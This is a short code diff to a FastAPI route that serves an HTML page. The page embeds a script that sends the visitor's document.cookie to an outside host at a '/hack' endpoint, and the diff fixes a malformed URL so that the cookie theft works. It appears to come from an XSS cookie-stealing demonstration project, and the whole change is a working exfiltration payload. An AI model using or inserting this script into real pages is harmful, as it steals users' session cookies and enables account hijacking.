@@ -32,7 +32,7 @@ def get_cookie(request: Request):
             <title>Document</title>
         </head>
         <body>
-            <script>fetch(`https://https://knyazevi81-fastapi-xss-cookie-888f.twc1.net/hack?cookie=${document.cookie}`)</script>
+            <script>fetch(`https://knyazevi81-fastapi-xss-cookie-888f.twc1.net/hack?cookie=${document.cookie}`)</script>
         </body>
         </html>
         """
